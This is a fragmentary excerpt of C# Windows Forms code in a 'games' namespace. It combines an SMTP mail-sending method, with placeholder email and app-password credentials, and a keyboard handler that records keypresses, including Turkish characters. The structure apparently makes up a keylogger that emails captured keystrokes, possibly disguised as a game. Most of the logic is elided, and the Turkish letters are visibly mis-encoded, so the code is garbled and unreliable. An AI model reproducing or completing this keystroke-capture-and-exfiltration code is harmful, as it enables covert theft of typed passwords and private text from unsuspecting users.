...
namespace games
{
    public partial class Form1 : Form
    {
        ...
        void MailGönderme()
        {
            ...
            istemci.Credentials = new System.Net.NetworkCredential("mail", "uygulama þifresi");
            istemci.Port = 587;
        ...
        void TusKombinasyonu(object sender, KeyEventArgs e)
        {
            ...
            else
            {
                ...
                {
                    // Türkçe karakterler
                    case Keys.OemOpenBrackets: c = shift ^ caps ? 'Ð' : 'ð'; break;
                    case Keys.Oem6: c = shift ^ caps ? 'Ü' : 'ü'; break;
                    case Keys.Oem1: c = shift ^ caps ? 'Þ' : 'þ'; break;
                    case Keys.Oem7: c = shift ^ caps ? 'Ý' : 'i'; break;
